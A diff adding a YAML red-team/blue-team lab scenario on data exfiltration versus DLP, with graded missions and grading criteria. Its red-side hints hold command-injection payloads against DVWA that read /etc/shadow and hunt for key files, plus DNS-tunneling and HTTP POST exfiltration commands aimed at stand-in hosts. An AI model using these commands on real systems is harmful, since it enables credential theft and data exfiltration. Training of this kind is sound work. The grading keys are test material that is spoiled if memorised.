@@ -1,0 +1,275 @@
+id: "exfil-vs-dlp"
+title: "데이터 유출 vs DLP"
+description: "내부 첩보에 의하면 공격자가 민감 데이터를 외부로 유출하려는 시도를 계획하고 있다. Red Team은 대상 시스템에서 민감 정보를 탐색하고 인코딩, DNS 터널링 등 다양한 방법으로 데이터를 유출해야 한다. Blue Team은 아웃바운드 트래픽을 모니터링하고 비정상 데이터 전송을 탐지하여 차단해야 한다."
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "DVWA의 Command Injection을 통해 대상 시스템에서 민감 파일 위치를 탐색하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/etc+-name+*.conf+-o+-name+*.key+-o+-name+*.pem+2>/dev/null|head+-20&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ".conf"
+      semantic:
+        intent: "MITRE T1083 (File and Directory Discovery) — exfil 전 sensitive file 식별. .conf/.key/.pem/.env/credentials 패턴 검색."
+        success_criteria:
+          - "find /etc 또는 /home 으로 sensitive ext (.conf/.key/.pem) 검색"
+          - "응답에 1개 이상 file path"
+          - "추가 (보너스): .env / .git / id_rsa / .aws/credentials 도 검색"
+        acceptable_methods:
+          - "find / -name '*.conf' -o -name '*.key' -o -name '*.pem'"
+          - "locate (있으면)"
+          - "grep -r 'password\\|secret\\|api_key' /etc/ 2>/dev/null"
+        negative_signs:
+          - "단일 path 만 + recursive 안 함"
+          - "/etc 만 + /home /var 등 다른 path 무시"
+
+  - order: 2
+    instruction: "Command Injection을 통해 /etc/shadow 파일 접근을 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/etc/shadow+2>&1|head+-5&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "root"
+      semantic:
+        intent: "MITRE T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow) — root hash 추출 시도. apache uid 면 차단되어야 정상."
+        success_criteria:
+          - "cat /etc/shadow 시도"
+          - "응답에 root: 시작 라인 (성공) 또는 Permission denied (정상 차단)"
+          - "성공/실패 분류"
+        acceptable_methods:
+          - "cat /etc/shadow"
+          - "/etc/passwd-shadow.bak (있으면)"
+          - "if SUID escalation 가능 → sudo cat"
+        negative_signs:
+          - "Permission denied 후 alternate path (/etc/passwd) 안 시도"
+
+  - order: 3
+    instruction: "JuiceShop API에서 사용자 데이터를 추출하라."
+    hint: "curl -s http://10.20.30.80:3000/api/Users | python3 -m json.tool | head -30"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "data"
+      semantic:
+        intent: "MITRE T1530 (Data from Cloud Storage Object) variant — REST API endpoint 에서 user PII bulk dump. 인증 우회 + IDOR 결합."
+        success_criteria:
+          - "GET /api/Users (인증 없이)"
+          - "응답에 data 배열 + email/username/role 필드"
+          - "최소 1 user record 노출"
+        acceptable_methods:
+          - "curl /api/Users"
+          - "curl /rest/admin/users (alternate)"
+          - "GraphQL introspection (있으면)"
+        negative_signs:
+          - "응답이 401/403 인데 우회 시도 안 함"
+          - "raw JSON dump 만 + record 분석 없음"
+
+  - order: 4
+    instruction: "추출한 데이터를 Base64로 인코딩하여 유출 준비를 하라."
+    hint: "echo 'sensitive_data:admin:password123' | base64"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "c2Vuc2l0aXZl"
+      semantic:
+        intent: "MITRE T1027 (Obfuscated Files or Information) — exfil 전 encoding. base64/hex/gzip+base64 등으로 IDS signature 우회."
+        success_criteria:
+          - "echo <data> | base64 명령"
+          - "응답에 base64 인코딩 결과 (== 종료, A-Za-z0-9+/)"
+          - "원본 sensitive 키워드가 raw 로 안 보임"
+        acceptable_methods:
+          - "base64 인코딩"
+          - "openssl enc -base64"
+          - "python3 -c 'import base64; print(base64.b64encode(...))'"
+          - "gzip + base64 (다단)"
+        negative_signs:
+          - "encode 안 하고 raw 전송 (DLP 즉시 탐지)"
+
+  - order: 5
+    instruction: "DNS 쿼리를 이용한 데이터 유출(DNS tunneling) 시뮬레이션을 수행하라."
+    hint: "echo 'exfil-test' | xxd -p | while read line; do nslookup $line.exfil.test 2>&1; done | head -10"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "exfil"
+      semantic:
+        intent: "MITRE T1048.003 (Exfiltration Over Alternative Protocol: DNS) — DNS 쿼리 ramework 의 subdomain 으로 data 전송. firewall 우회 (UDP 53 항상 허용)."
+        success_criteria:
+          - "data → hex/base64 인코딩 후 subdomain 으로 분할"
+          - "nslookup 또는 dig 으로 DNS 쿼리 발송"
+          - "최소 1개 쿼리 + exfil 도메인 패턴 (data.exfil.attacker.com)"
+        acceptable_methods:
+          - "echo data | xxd -p | nslookup ...exfil.test"
+          - "dig +short txt data.attacker.com"
+          - "iodine / dnscat2 (전용 도구)"
+        negative_signs:
+          - "DNS 쿼리 1회만 + chunk 분할 없음"
+          - "single subdomain 으로 짧은 data 만 전송"
+
+  - order: 6
+    instruction: "HTTP를 이용한 데이터 유출을 시뮬레이션하라 (POST 요청에 인코딩된 데이터 포함)."
+    hint: "curl -s -X POST http://10.20.30.80:3000 -d \"data=$(echo 'stolen_credentials' | base64)\" -o /dev/null -w '%{http_code}'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "MITRE T1041 (Exfiltration Over C2 Channel) — HTTP POST 로 base64 인코딩된 data 전송. legitimate web traffic 처럼 위장. 가장 흔한 exfil 방법."
+        success_criteria:
+          - "curl -X POST + body 에 base64 data"
+          - "Content-Type: application/x-www-form-urlencoded 또는 application/json"
+          - "응답 status code (200/201) — 전송 성공 확인"
+        acceptable_methods:
+          - "curl -X POST -d 'data=<b64>'"
+          - "curl --data-binary @file"
+          - "wget --post-data ..."
+          - "python3 requests.post"
+        negative_signs:
+          - "GET 방식 (URL query 노출 — 더 쉽게 탐지됨)"
+          - "raw plaintext POST (encoding 안 함)"
+
+blue_missions:
+  - order: 1
+    instruction: "suricata에서 비정상 DNS 쿼리 패턴을 탐지하라."
+    hint: "grep -i 'dns' /var/log/suricata/eve.json | tail -20"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "dns"
+      semantic:
+        intent: "Red #5 DNS tunneling 탐지 — DNS 쿼리 길이 비정상 (>50 chars subdomain), entropy 높음, NXDOMAIN 빈도. ET DNS sid 또는 사이트별 baseline."
+        success_criteria:
+          - "/var/log/suricata/eve.json grep dns"
+          - "비정상 패턴 (긴 subdomain / NXDOMAIN burst / 비표준 TLD) 식별"
+          - "최소 1개 DNS event 분석 + classification"
+        acceptable_methods:
+          - "grep + tail eve.json"
+          - "jq '.event_type==\"dns\" and (.dns.rrname | length) > 50' eve.json"
+          - "Wazuh DNS decoder + baseline anomaly"
+          - "dnstop / passivedns 도구"
+        negative_signs:
+          - "dns event 만 dump + 비정상 패턴 분석 없음"
+          - "subdomain 길이/entropy 측정 안 함"
+
+  - order: 2
+    instruction: "nftables에서 외부로 나가는 DNS 트래픽을 허용된 DNS 서버로만 제한하는 룰을 추가하라."
+    hint: "nft add rule inet filter output udp dport 53 ip daddr != 10.20.30.1 drop"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "DNS egress 제한 — 사내 DNS server (10.20.30.1) 만 허용, 다른 외부 DNS 차단. DNS tunneling 의 가장 효과적 차단."
+        success_criteria:
+          - "nft add rule inet filter output udp dport 53"
+          - "ip daddr != <internal_dns> drop (또는 allowlist 만 accept)"
+          - "rule 적용 후 nft list 확인"
+        acceptable_methods:
+          - "nft + ip daddr filter"
+          - "iptables OUTPUT -p udp --dport 53 -d ! <dns> -j DROP"
+          - "Cilium / Calico DNSPolicy"
+          - "BIND views + ACL"
+        negative_signs:
+          - "DNS 전체 차단 (legitimate 도 같이 끊김)"
+          - "TCP 53 (DNS over TCP) 누락"
+
+  - order: 3
+    instruction: "suricata의 eve.json에서 대용량 HTTP POST 요청을 모니터링하라."
+    hint: "grep '\"http\"' /var/log/suricata/eve.json | grep -i 'POST' | tail -10"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "http"
+      semantic:
+        intent: "Red #6 HTTP POST exfil 탐지 — body size 비정상 (>10KB), Content-Type application/octet-stream, 정해지지 않은 endpoint 로 POST."
+        success_criteria:
+          - "eve.json 의 http event 중 POST method 추출"
+          - "request_body_len 또는 length 필드 분석 (대용량 식별)"
+          - "비정상 destination (외부 unknown) 분류"
+        acceptable_methods:
+          - "grep + jq '.http.http_method==\"POST\"' eve.json"
+          - "awk 분석 (length 정렬)"
+          - "Wazuh HTTP decoder"
+        negative_signs:
+          - "POST event 만 + size/destination 분석 없음"
+          - "small payload (인코딩된 비번 1줄) 가 임계값 아래라 놓침"
+
+  - order: 4
+    instruction: "Apache 접근 로그에서 비정상적인 데이터 전송 패턴(Base64 등)을 탐지하라."
+    hint: "grep -iE 'base64|data=|exfil' /var/log/apache2/access.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "base64"
+      semantic:
+        intent: "Apache log 의 URL/body 에서 base64 패턴 매칭 — exfil 시 GET param 또는 POST body 의 인코딩된 data 식별. WAF backup detection."
+        success_criteria:
+          - "access.log grep base64/data=/exfil 키워드"
+          - "URL parameter 의 long base64 string (== 종료) 매칭"
+          - "POST request 의 body 길이 비정상 식별"
+        acceptable_methods:
+          - "grep -iE 'base64|data=|exfil' access.log"
+          - "awk '{if (length($7) > 200) print}' access.log (long URL)"
+          - "GoAccess 실시간 분석"
+        negative_signs:
+          - "키워드 매칭 0 + alternate (length 기반) 안 함"
+          - "raw dump 만 + 분류 없음"
+
+  - order: 5
+    instruction: "Wazuh에서 데이터 유출 관련 알림을 확인하라."
+    hint: "grep -iE 'exfil\\|data_leak\\|sensitive' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 10
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+      semantic:
+        intent: "Wazuh 의 data exfil group rule (예: PCI compliance / data loss prevention) 매칭. SIEM 차원 통합 alert."
+        success_criteria:
+          - "alerts.json grep exfil/data_leak/sensitive"
+          - "최소 1개 alert 의 rule.id + decoder + group"
+          - "(보너스) data classification 분류 (PII/credential/PCI)"
+        acceptable_methods:
+          - "grep + jq alerts.json"
+          - "Wazuh API: GET /security/agents/<id>/alerts?q=group:dlp"
+          - "Kibana DLP dashboard"
+        negative_signs:
+          - "alerts.json 비어있음 — DLP 룰 미설정"
+          - "raw alert dump 만"
+
+  - order: 6
+    instruction: "nftables에 아웃바운드 트래픽에 대한 rate limiting을 적용하여 대량 데이터 전송을 제한하라."
+    hint: "nft add rule inet filter output tcp dport { 80, 443 } ct state new limit rate 30/minute accept"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+      semantic:
+        intent: "Outbound rate limit — 분당 N connection 제한으로 대용량 exfil 속도 차단. legitimate traffic 영향 최소화하면서 burst exfil 차단."
+        success_criteria:
+          - "nft add rule + ct state new + limit rate"
+          - "tcp dport 80/443 (web) 또는 다른 service"
+          - "rate 30/minute (또는 적절한 baseline)"
+        acceptable_methods:
+          - "nft + limit rate"
+          - "iptables -m limit --limit <N>/min"
+          - "Linux tc (traffic control) bandwidth shaping"
+          - "fail2ban + custom action"
+        negative_signs:
+          - "rate 너무 낮음 (legitimate user 차단)"
+          - "ct state new 누락 (기존 connection 도 영향)"
